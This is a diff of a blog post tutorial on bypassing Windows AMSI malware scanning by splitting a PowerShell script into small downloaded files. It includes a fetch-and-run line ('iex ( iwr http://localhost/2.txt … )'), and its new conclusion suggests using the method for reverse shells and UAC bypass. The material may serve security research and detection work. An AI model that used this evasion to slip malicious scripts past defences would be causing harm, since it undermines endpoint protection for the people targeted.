@@ -2,7 +2,7 @@
 title: "Divide And Bypass: A new Simple Way to Bypass AMSI"
 author: x4sh3s
 date: 2022-09-07 13:32:00 -0500
-categories: [Defences Evasion, Tutorial]
+categories: [Defences Evasion]
 tags: [amsi, powershell, bypass, windows ]
 image:
   path: /commons/divide.jpg
@@ -229,11 +229,19 @@ iex ( iwr http://localhost/2.txt -UseBasicParsing );
 
 It Successfully Bypass AMSI, without changing a letter in the code! Niice..
 
+![It's All Good, Man](/commons/Saul_Godman.jif)
+
 > In case it's detected, breaking the script into more files (Line/file) will do the job, unless Microsoft finds a way to deny this techinique. Until then, Enjoy ^^
 {: .prompt-warning }
 
 
 ## Conclusion
+
+We reached the end of the post, 
+
+As a review, we saw how to bypass AMSI by dividing a script into small file. I thing the most useful use case of this method is execute an AMSI bypass, but it can be applied on any scripts ( small scripts ), Reverse shell, FODHelper UAC Bypass .. I didn't testing on a script that contains defined functions, but the principle stay the same.
+
+i hope you learned something new by reading this post, if you have any comment/idea let me know, Any feedback will be appreciated .. 
 
 ## Links & Resources
 
